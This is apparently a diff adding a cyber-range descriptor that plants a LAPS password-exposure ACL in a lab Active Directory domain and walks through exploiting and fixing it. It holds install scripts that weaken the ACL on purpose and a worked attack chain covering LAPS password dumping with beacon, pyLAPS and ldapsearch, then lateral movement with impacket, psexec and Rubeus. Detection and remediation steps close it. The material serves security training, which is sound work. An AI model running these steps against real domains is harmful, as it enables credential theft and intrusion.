@@ -1,0 +1,599 @@
+# Bolt-on: LAPS Attribute Readable by Domain Users
+# -------------------------------------------------
+# Install grants `Read All Properties` on the `ms-Mcs-AdmPwd` attribute
+# of the Computers OU to Domain Users — any authenticated user can then
+# enumerate LAPS-managed local administrator passwords with a single
+# Get-ADComputer query. This breaks the LAPS threat model entirely.
+#
+# Patch revokes the bad ACE, restores the canonical baseline (admins-
+# only Read), and uses Find-AdmPwdExtendedRights to confirm no non-admin
+# principal retains the right.
+#
+# Elastic rule coverage is intentionally `no-rule` — LAPS attribute reads
+# fire as ordinary LDAP queries (Event 1644) which most envs don't log
+# without explicit Directory-Services-Field-Engineering auditing on. The
+# fallback template covers the canonical 5136 (Directory Service Object
+# Modified) write pattern that fires when the bad ACE is INITIALLY granted,
+# plus the LDAP 1644 search filter `ms-mcs-admpwd=*` heuristic.
+
+id: bolton.credential-exposure.laps-readable-by-domain-users
+slug: laps-readable-by-domain-users
+name: "LAPS Attribute Readable by Domain Users"
+version: "1.0.0"
+author: "Red Team Infra"
+last_updated: 2026-05-19
+
+category: credential-exposure
+subcategory: laps
+tags:
+  - laps
+  - ms-mcs-admpwd
+  - acl-misconfig
+  - credential-access
+  - local-admin
+description: >
+  Grants the Domain Users group `Read All Properties` (and crucially the
+  `Read ms-Mcs-AdmPwd` extended right) on the Computers OU. The result:
+  any authenticated user can `Get-ADComputer -Filter * -Properties
+  ms-Mcs-AdmPwd` and harvest every LAPS-managed local administrator
+  password across the domain. The misconfig usually appears in real
+  environments when an admin clones a `Read All Properties` permission
+  from an OU template without realising the LAPS attribute is
+  Confidential-flagged and inherits the broader Read.
+
+cve: []
+references:
+  - "https://attack.mitre.org/techniques/T1552/004/"
+  - "https://www.microsoft.com/en-us/download/details.aspx?id=46899"
+  - "https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview"
+  - "https://specterops.io/wp-content/uploads/sites/3/2022/06/an_ace_up_the_sleeve.pdf"
+
+mitre:
+  tactic:
+    id: TA0006
+    name: "Credential Access"
+  technique:
+    id: T1552
+    name: "Unsecured Credentials"
+  subtechnique:
+    id: T1552.004
+    name: "Private Keys"
+  notes: >
+    LAPS doesn't fit neatly under any T1552 sub — `Private Keys` is the
+    closest published sub (the LAPS attribute is a stored credential
+    secret). The descriptor primarily models the parent T1552 (Unsecured
+    Credentials). Phase 2 schema may add a T1552.999 (Local Admin Password)
+    custom sub.
+
+detection:
+  # LAPS reads via LDAP are not directly visible in standard Windows event
+  # streams without enabling DS Field Engineering category auditing
+  # (Event 1644). The public Elastic rules repo does not include a rule
+  # that fires on ms-Mcs-AdmPwd attribute reads.
+  coverage_status: no-rule
+  elastic_rules: []
+  fallback_rule_template: "webapp/bolton/rule_templates/laps-read-domain-users.j2.yml"
+  signal_sources:
+    - "Windows Event 5136 (Directory Service object modified — nTSecurityDescriptor on Computers OU)"
+    - "Windows Event 1644 (LDAP search — filter contains ms-Mcs-AdmPwd or msLAPS-Password)"
+    - "Sysmon Event 1 — powershell.exe with Get-AdmPwdPassword / Get-LapsADPassword cmdlets"
+    - "Auditd via SACL — Read access to objects of class computer in protected OU"
+
+targets:
+  supported_os:
+    - family: windows
+      min_version: "2016"
+      max_version: "2025"
+      edition_in: ["Datacenter", "Standard"]
+  required_roles:
+    - domain_controller
+  required_services: []
+  required_domain_function_level: "2016"
+
+depends_on: []
+conflicts_with: []
+
+side_effects:
+  global: true         # ACL change on a domain-wide OU
+  network_visible: false
+  reboot_required: false
+
+install:
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: community.windows.win_powershell
+      description: "Capture the baseline ACL on the Computers OU for clean revert in patch."
+      role_vars:
+        script: |
+          Import-Module ActiveDirectory
+          $domDn = (Get-ADDomain).DistinguishedName
+          $ouDn  = "CN=Computers,$domDn"
+          $baseline = Get-Acl "AD:$ouDn"
+          $baselinePath = "C:\ProgramData\bolton\laps-computers-baseline.sddl"
+          New-Item -Path (Split-Path $baselinePath) -ItemType Directory -Force | Out-Null
+          $baseline.Sddl | Out-File -Encoding UTF8 -FilePath $baselinePath
+    - ansible_role: community.windows.win_powershell
+      description: "Grant Domain Users Read All Properties on the Computers OU — leaks ms-Mcs-AdmPwd."
+      role_vars:
+        script: |
+          Import-Module ActiveDirectory
+          $domDn = (Get-ADDomain).DistinguishedName
+          $ouDn  = "CN=Computers,$domDn"
+          $acl   = Get-Acl "AD:$ouDn"
+          $sid   = (Get-ADGroup 'Domain Users').SID
+          $ace   = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+            $sid,
+            'ReadProperty',
+            'Allow',
+            [System.DirectoryServices.ActiveDirectorySecurityInheritance]::Descendents,
+            [Guid]'00000000-0000-0000-0000-000000000000')
+          $acl.AddAccessRule($ace)
+          Set-Acl "AD:$ouDn" -AclObject $acl
+  verify:
+    probe: |
+      Import-Module ActiveDirectory
+      $domDn = (Get-ADDomain).DistinguishedName
+      $ouDn  = "CN=Computers,$domDn"
+      $acl   = Get-Acl "AD:$ouDn"
+      $sid   = (Get-ADGroup 'Domain Users').SID
+      $hit   = $acl.Access | Where-Object {
+        $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value -eq $sid.Value -and
+        $_.ActiveDirectoryRights -match 'ReadProperty'
+      }
+      if ($hit) { exit 0 } else { exit 1 }
+    timeout_seconds: 60
+    expect_exit_code: 0
+
+uninstall:
+  description: "Strip the Domain Users Read ACE from the Computers OU."
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: community.windows.win_powershell
+      description: "Remove the bolt-on Read ACE."
+      role_vars:
+        script: |
+          Import-Module ActiveDirectory
+          $domDn = (Get-ADDomain).DistinguishedName
+          $ouDn  = "CN=Computers,$domDn"
+          $acl   = Get-Acl "AD:$ouDn"
+          $sid   = (Get-ADGroup 'Domain Users').SID
+          $toRemove = $acl.Access | Where-Object {
+            $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value -eq $sid.Value -and
+            $_.ActiveDirectoryRights -match 'ReadProperty'
+          }
+          foreach ($ace in $toRemove) { [void]$acl.RemoveAccessRule($ace) }
+          Set-Acl "AD:$ouDn" -AclObject $acl
+  verify:
+    probe: |
+      Import-Module ActiveDirectory
+      $domDn = (Get-ADDomain).DistinguishedName
+      $ouDn  = "CN=Computers,$domDn"
+      $acl   = Get-Acl "AD:$ouDn"
+      $sid   = (Get-ADGroup 'Domain Users').SID
+      $hit   = $acl.Access | Where-Object {
+        $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value -eq $sid.Value -and
+        $_.ActiveDirectoryRights -match 'ReadProperty'
+      }
+      if ($hit) { exit 1 } else { exit 0 }
+    timeout_seconds: 30
+    expect_exit_code: 0
+
+patch:
+  description: >
+    Restore the captured baseline ACL on the Computers OU and explicitly
+    re-confine `Read ms-Mcs-AdmPwd` to the Tier-0 admin group. Uses the
+    LAPS Admin module's Set-AdmPwdReadPasswordPermission cmdlet to layer
+    the canonical permission on top of the restored baseline. The
+    confidentiality bit on ms-Mcs-AdmPwd remains intact (it was never
+    cleared by the install — only the parent-ACL inheritance was abused).
+  patch_reference:
+    - "https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-management-policy-settings"
+    - "https://www.microsoft.com/en-us/download/details.aspx?id=46899"
+  complexity: low
+  side_effects:
+    - "Computers OU ACL reverted to captured baseline"
+    - "Read-ms-Mcs-AdmPwd extended right granted only to Tier-0 admin group (default: Domain Admins)"
+    - "Find-AdmPwdExtendedRights output enumerated to audit log"
+    - "Any tool/script that depended on Domain-Users readability of ms-Mcs-AdmPwd will break"
+  rollback_supported: true
+  steps:
+    - ansible_role: community.windows.win_powershell
+      description: "Restore the baseline OU ACL."
+      role_vars:
+        script: |
+          Import-Module ActiveDirectory
+          $domDn = (Get-ADDomain).DistinguishedName
+          $ouDn  = "CN=Computers,$domDn"
+          $baselinePath = "C:\ProgramData\bolton\laps-computers-baseline.sddl"
+          $sddl = Get-Content $baselinePath -Raw
+          $acl  = Get-Acl "AD:$ouDn"
+          $acl.SetSecurityDescriptorSddlForm($sddl)
+          Set-Acl "AD:$ouDn" -AclObject $acl
+    - ansible_role: community.windows.win_powershell
+      description: "Re-grant LAPS extended right to Tier-0 admin group only."
+      role_vars:
+        script: |
+          Import-Module AdmPwd.PS -ErrorAction SilentlyContinue
+          $domDn = (Get-ADDomain).DistinguishedName
+          $ouDn  = "CN=Computers,$domDn"
+          if (Get-Command Set-AdmPwdReadPasswordPermission -ErrorAction SilentlyContinue) {
+            Set-AdmPwdReadPasswordPermission -OrgUnit $ouDn -AllowedPrincipals "Domain Admins"
+          }
+          # Emit current state for verification
+          Find-AdmPwdExtendedRights -Identity $ouDn | Format-Table -AutoSize
+  verify:
+    probe: |
+      Import-Module ActiveDirectory
+      $domDn = (Get-ADDomain).DistinguishedName
+      $ouDn  = "CN=Computers,$domDn"
+      $acl   = Get-Acl "AD:$ouDn"
+      $sid   = (Get-ADGroup 'Domain Users').SID
+      $domUsersHit = $acl.Access | Where-Object {
+        $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value -eq $sid.Value -and
+        $_.ActiveDirectoryRights -match 'ReadProperty'
+      }
+      if (-not $domUsersHit) { exit 0 } else { exit 1 }
+    timeout_seconds: 60
+    expect_exit_code: 0
+  exploit_probe_after_patch: "webapp/bolton/exploit_probes/laps_read_check.sh"
+
+patch_revert:
+  description: "Re-grant Domain Users Read on the Computers OU — Get-ADComputer -Properties ms-Mcs-AdmPwd works again."
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: community.windows.win_powershell
+      description: "Re-add the bad Read ACE."
+      role_vars:
+        script: |
+          Import-Module ActiveDirectory
+          $domDn = (Get-ADDomain).DistinguishedName
+          $ouDn  = "CN=Computers,$domDn"
+          $acl   = Get-Acl "AD:$ouDn"
+          $sid   = (Get-ADGroup 'Domain Users').SID
+          $ace   = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+            $sid,
+            'ReadProperty',
+            'Allow',
+            [System.DirectoryServices.ActiveDirectorySecurityInheritance]::Descendents,
+            [Guid]'00000000-0000-0000-0000-000000000000')
+          $acl.AddAccessRule($ace)
+          Set-Acl "AD:$ouDn" -AclObject $acl
+  verify:
+    probe: |
+      Import-Module ActiveDirectory
+      $domDn = (Get-ADDomain).DistinguishedName
+      $ouDn  = "CN=Computers,$domDn"
+      $acl   = Get-Acl "AD:$ouDn"
+      $sid   = (Get-ADGroup 'Domain Users').SID
+      $hit   = $acl.Access | Where-Object {
+        $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value -eq $sid.Value -and
+        $_.ActiveDirectoryRights -match 'ReadProperty'
+      }
+      if ($hit) { exit 0 } else { exit 1 }
+    timeout_seconds: 30
+    expect_exit_code: 0
+  warning: "Domain Users can read ms-Mcs-AdmPwd again. Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd leaks all LAPS passwords."
+
+cost:
+  storage_mb: 1
+  cpu_pct: 0
+  detectability: quiet
+
+curriculum:
+  title: "LAPS Password Disclosure to Domain Users"
+  summary: >
+    Guided walkthrough of harvesting LAPS-managed local-admin passwords
+    from `testlab.local` when the LAPS attribute is mis-ACL'd. You will
+    enumerate the bad ACE with BloodHound, dump every LAPS password
+    across the domain in one LDAP query as `TESTLAB\jdoe`, validate the
+    creds against the target member server `tlms01`, and walk the
+    blue-team detection + remediation. Covers both LAPS v1
+    (`ms-Mcs-AdmPwd`) and Windows LAPS / LAPS v2 (`msLAPS-Password`).
+  learning_objectives:
+    - "Differentiate LAPS v1 (`ms-Mcs-AdmPwd`) from Windows LAPS v2 (`msLAPS-Password`) and the ACL flavours each uses."
+    - "Enumerate the broken ACL with PowerView `Get-DomainObjectAcl` and confirm via `LAPSToolkit`."
+    - "Dump every LAPS password with a single Get-ADComputer LDAP query as a low-priv user."
+    - "Pull the password from the attack box with `pyLAPS` / `LDAPSearch`."
+    - "Identify the LDAP 1644 audit signal and apply Set-AdmPwdReadPasswordPermission to remediate."
+  prerequisites:
+    - "Beacon on tlws01 (10.99.50.12) as TESTLAB\\jdoe (Welcome1!)"
+    - "LAPSToolkit (`Import-Module C:\\Tools\\LAPSToolkit.ps1`) or PowerView available to the beacon"
+    - "Kali at 192.168.1.100 with `pyLAPS` (`pipx install pylaps`) + ldapsearch"
+    - "Bolt-on installed: the `Read All Properties` ACE on `CN=Computers,DC=testlab,DC=local` is granted to Domain Users"
+  estimated_total_minutes: 30
+  steps:
+    - id: "01-context-laps-versions"
+      title: "LAPS v1 vs Windows LAPS — what to look for"
+      estimated_minutes: 4
+      markdown: |
+        ## Step 1 — Know which LAPS you're attacking
+
+        Two flavours exist in the wild:
+
+        | Version | Attribute | Confidentiality bit | Released |
+        |---|---|---|---|
+        | **LAPS v1** (Legacy MS LAPS) | `ms-Mcs-AdmPwd` | Set during schema extension via `Update-AdmPwdADSchema` | 2015 |
+        | **Windows LAPS (v2)** | `msLAPS-Password` (JSON) + `msLAPS-EncryptedPassword` | Always Confidential; v2 also supports DPAPI-NG encryption tied to a domain SID | Server 2019 / Win11 22H2+ |
+
+        The bolt-on uses LAPS v1 (`ms-Mcs-AdmPwd`) for compatibility with
+        Server 2016+ default schema. The attack technique is identical
+        across both — only the attribute name changes. In v2, if
+        encryption is enabled, the JSON value will require DPAPI-NG
+        decryption with a Domain Admin context — fall back to v1
+        attribute reads if present (many tenants run both).
+
+        Confirm which is provisioned on `testlab.local`:
+
+        ```text
+        beacon> powerpick Get-ADObject -Filter "name -eq 'ms-Mcs-AdmPwd'" `
+                  -SearchBase "CN=Schema,CN=Configuration,DC=testlab,DC=local"
+        beacon> powerpick Get-ADObject -Filter "name -eq 'ms-LAPS-Password'" `
+                  -SearchBase "CN=Schema,CN=Configuration,DC=testlab,DC=local"
+        ```
+
+        The lab provisions both, but only `tlms01` has v1 populated for
+        this walkthrough.
+    - id: "02-find-readable-acl"
+      title: "Find computers with readable LAPS attribute"
+      estimated_minutes: 6
+      markdown: |
+        ## Step 2 — Enumerate the bad ACE
+
+        **LAPSToolkit (preferred):**
+
+        ```text
+        beacon> powerpick Import-Module C:\Tools\LAPSToolkit.ps1; \
+                  Get-LAPSComputers | Format-Table ComputerName,Password,Expiration
+        ```
+
+        Hosts where the current user can read the attribute return a
+        non-null `Password`. The lab should show `tlms01.testlab.local`
+        with the current LAPS-rotated password.
+
+        **PowerView path (manual ACL inspection):**
+
+        ```text
+        beacon> powerpick Get-DomainObjectAcl -SearchBase 'CN=Computers,DC=testlab,DC=local' `
+                  -ResolveGUIDs | Where-Object { $_.ObjectAceType -match 'ms-Mcs-AdmPwd' -or `
+                                                   $_.ActiveDirectoryRights -match 'ReadProperty' } | `
+                  Select-Object SecurityIdentifier,ActiveDirectoryRights,ObjectAceType
+        ```
+
+        Domain Users SID (`S-1-5-21-…-513`) with `ReadProperty` on the
+        `ms-Mcs-AdmPwd` GUID is the bolt-on's footprint.
+
+        **BloodHound:** the `ReadLAPSPassword` edge from `Domain Users`
+        to `tlms01.testlab.local` appears with the v4.3+ collection
+        method. Run `Get-LAPSPasswords -Domain testlab.local` against
+        the BloodHound CE API to bulk-extract.
+
+        > **Detection:** these reads generate Event 4662 with the
+        > attribute GUID on the DC — but only if the DC has the
+        > `Directory Service Access` audit subcategory enabled with
+        > a SACL on the Computers OU. Out of the box: silent.
+      assessment:
+        question: "What makes the `ms-Mcs-AdmPwd` attribute leak so dangerous compared to a normal LDAP property leak?"
+        options:
+          - "It contains the DPAPI master key for the user's profile."
+          - "It contains the *cleartext* local administrator password — no cracking required."
+          - "It enables SYSTEM-level code execution on the DC."
+          - "It allows the attacker to bypass MFA."
+        correct_index: 1
+        explanation: >
+          LAPS stores the local Administrator password as plaintext in
+          the directory (encrypted in transit by LDAPS / sealed by the
+          confidentiality bit, but plaintext-at-rest). A single
+          successful LDAP query returns immediately-usable credentials —
+          no hashcat, no cracking, no privilege escalation needed before
+          lateral movement begins.
+    - id: "03-dump-passwords"
+      title: "Bulk-dump all LAPS passwords"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 3 — Harvest every password in the domain
+
+        **Cobalt Strike BOF (preferred — no .NET surface):**
+        Outflank's `C2-Tool-Collection / LAPSDumper` BOF
+        (https://github.com/outflanknl/C2-Tool-Collection). From the
+        beacon:
+
+        ```text
+        beacon> inline-execute /opt/bofs/laps_dumper.x64.o testlab.local
+        ```
+
+        Returns a table of `ComputerName | Password | Expiry` for every
+        computer the current user can read.
+
+        **PowerShell alternative (LAPSToolkit / native):**
+
+        ```text
+        beacon> powerpick Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime | `
+                  Where-Object { $_.'ms-Mcs-AdmPwd' } | `
+                  Select-Object Name, @{N='Password';E={$_.'ms-Mcs-AdmPwd'}}, `
+                                @{N='Expires';E={[datetime]::FromFileTime([int64]$_.'ms-Mcs-AdmPwdExpirationTime')}}
+        ```
+
+        Expected output for the lab:
+
+        ```
+        Name      Password           Expires
+        ----      --------           -------
+        tlms01    Th!sP@ssRot8s42    5/30/2026 4:15:00 AM
+        ```
+
+        **Linux/Impacket-style alternative — from Kali (192.168.1.100):**
+
+        ```bash
+        # pyLAPS
+        pyLAPS --user 'jdoe' --password 'Welcome1!' \
+               --domain testlab.local --dc-ip 10.99.50.10 get
+
+        # Raw ldapsearch (works against any DC with LDAP/636)
+        ldapsearch -H ldap://10.99.50.10 -x \
+                   -D 'jdoe@testlab.local' -w 'Welcome1!' \
+                   -b 'DC=testlab,DC=local' \
+                   '(&(objectClass=computer)(ms-Mcs-AdmPwd=*))' \
+                   ms-Mcs-AdmPwd
+        ```
+
+        For **Windows LAPS v2**, substitute `msLAPS-Password` and parse
+        the JSON value:
+
+        ```bash
+        ldapsearch -H ldap://10.99.50.10 -x \
+                   -D 'jdoe@testlab.local' -w 'Welcome1!' \
+                   -b 'DC=testlab,DC=local' \
+                   '(&(objectClass=computer)(msLAPS-Password=*))' \
+                   msLAPS-Password
+        ```
+
+        Each v2 result is JSON: `{"n":"administrator","t":"...","p":"<cleartext>"}`.
+
+        > **Detection:** Event 1644 on the DC with filter
+        > `(ms-Mcs-AdmPwd=*)` is the canonical SIEM hook — *if* the
+        > `Directory Service Field Engineering` registry hint is set
+        > (`HKLM\SYSTEM\CCS\Services\NTDS\Diagnostics\15 Field
+        > Engineering` = 5). Most environments don't enable it; that's
+        > why this bolt-on is `coverage_status: no-rule`.
+    - id: "04-validate-and-move"
+      title: "Validate creds + move laterally to tlms01"
+      estimated_minutes: 6
+      markdown: |
+        ## Step 4 — Use the harvested password
+
+        From the Kali box:
+
+        ```bash
+        # SMB validate
+        impacket-smbclient TESTLAB/Administrator:'Th!sP@ssRot8s42'@10.99.50.11 \
+                          -no-pass 2>/dev/null || \
+            smbclient -U 'TESTLAB\Administrator%Th!sP@ssRot8s42' //10.99.50.11/C$
+
+        # Confirm local admin via RPC
+        impacket-wmiexec TESTLAB/Administrator:'Th!sP@ssRot8s42'@10.99.50.11
+        ```
+
+        From the beacon — pass-the-hash style via the captured plaintext
+        is unnecessary; just run `make_token` and lift:
+
+        ```text
+        beacon> make_token TLMS01\Administrator Th!sP@ssRot8s42
+        beacon> ls \\10.99.50.11\C$
+        beacon> jump psexec64 10.99.50.11 <listener>
+        ```
+
+        You now hold SYSTEM on `tlms01`. From here: dump SAM, harvest
+        cached creds, pivot toward the DC. The LAPS rotation interval
+        (default 30 days) means the password is durable for the
+        engagement.
+
+        > **Detection:** the *use* of the password generates Event 4624
+        > Type 3 from `tlws01`'s IP into `tlms01`'s Security log. SOCs
+        > that baseline "which workstations talk to which servers"
+        > catch this on a UEBA timeline — but raw event volume hides
+        > it well.
+    - id: "05-windows-laps-v2-note"
+      title: "Windows LAPS v2 — encrypted password edge case"
+      estimated_minutes: 3
+      markdown: |
+        ## Step 5 — When v2 encryption blocks you
+
+        If `msLAPS-EncryptedPassword` is populated instead of
+        `msLAPS-Password`, the password is wrapped with DPAPI-NG and
+        keyed to a specific principal (the "Authorized password
+        decryptors" group set at LAPS GPO time — usually Domain Admins).
+        Reading the attribute returns base64 ciphertext that decrypts
+        only under that principal's context.
+
+        Two practical options for the engagement:
+        - **If you have *any* member of the decryptor group**:
+          ```text
+          beacon> execute-assembly /opt/rubeus/Rubeus.exe asktgt /user:<dec_user> \
+                    /password:<pw> /domain:testlab.local /ptt
+          beacon> powerpick Get-LapsADPassword -Identity tlms01 -AsPlainText
+          ```
+        - **If not**: the unencrypted v1 attribute is your fallback —
+          which is exactly the misconfig this bolt-on simulates.
+          Always check both attributes on every target.
+
+        > **Detection:** Get-LapsADPassword via PowerShell triggers
+        > Sysmon Event 1 with `Get-LapsADPassword` in the command line —
+        > a high-fidelity signal worth alerting on.
+    - id: "06-detect-and-mitigate"
+      title: "Blue-team — detection + mitigation"
+      estimated_minutes: 4
+      markdown: |
+        ## Step 6 — Detection + remediation
+
+        ### Telemetry to turn on
+
+        1. **DS Field Engineering audit** for LDAP 1644:
+           ```cmd
+           reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics" /v "15 Field Engineering" /t REG_DWORD /d 5 /f
+           ```
+           Then ship the Directory Service log to your SIEM.
+
+        2. **SACL on Computers OU** for `Read Property — ms-Mcs-AdmPwd`
+           + `msLAPS-Password` -> 4662 events with attribute GUID.
+
+        3. **Sysmon process create** alert on PowerShell command-lines
+           containing `Get-LAPSADPassword | Get-AdmPwdPassword | Get-LAPSComputers`.
+
+        ### The fix (definitive)
+
+        From the bolt-on's `patch` block, the canonical commands are:
+
+        ```powershell
+        # 1. Strip Domain Users ACE
+        $ou  = 'CN=Computers,DC=testlab,DC=local'
+        $acl = Get-Acl "AD:$ou"
+        $sid = (Get-ADGroup 'Domain Users').SID
+        $bad = $acl.Access | Where-Object {
+          $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value -eq $sid.Value -and
+          $_.ActiveDirectoryRights -match 'ReadProperty'
+        }
+        foreach ($ace in $bad) { [void]$acl.RemoveAccessRule($ace) }
+        Set-Acl "AD:$ou" -AclObject $acl
+
+        # 2. Restrict LAPS reads to Tier-0 only
+        Import-Module AdmPwd.PS
+        Set-AdmPwdReadPasswordPermission -OrgUnit $ou -AllowedPrincipals "Domain Admins"
+
+        # 3. Audit who else can read
+        Find-AdmPwdExtendedRights -Identity $ou | Format-Table -AutoSize
+        ```
+
+        For Windows LAPS v2, switch to:
+
+        ```powershell
+        Set-LapsADReadPasswordPermission -Identity $ou -AllowedPrincipals "TESTLAB\Tier0-LAPS-Readers"
+        Find-LapsADExtendedRights -Identity $ou
+        ```
+
+        ### Tier-0 best practice
+
+        - LAPS readers should be a dedicated security group, not Domain
+          Admins (separation of duties).
+        - Enable **password encryption** in Windows LAPS v2 — even if
+          ACLs are wrong, the attacker needs the decryptor principal's
+          context to use the data.
+        - Run `Find-AdmPwdExtendedRights` quarterly as part of access
+          review.
+      assessment:
+        question: "Which control prevents this exact attack even if a future admin re-introduces a broken ACE?"
+        options:
+          - "Disabling the LAPS schema extension"
+          - "Migrating to Windows LAPS v2 with password encryption enabled — ciphertext is useless without the decryptor principal"
+          - "Renaming the local Administrator account"
+          - "Increasing LAPS password length"
+        correct_index: 1
+        explanation: >
+          ACL hygiene drift is constant — every quarterly access review
+          finds new misplaced ACEs. Windows LAPS v2 password encryption
+          (DPAPI-NG keyed to an authorised principal) is the only
+          *defensive-in-depth* control that makes a leaked attribute
+          value non-actionable. The other items raise the bar slightly
+          but don't change the attack outcome if the ACL goes wrong
+          again.
+
+status: stable
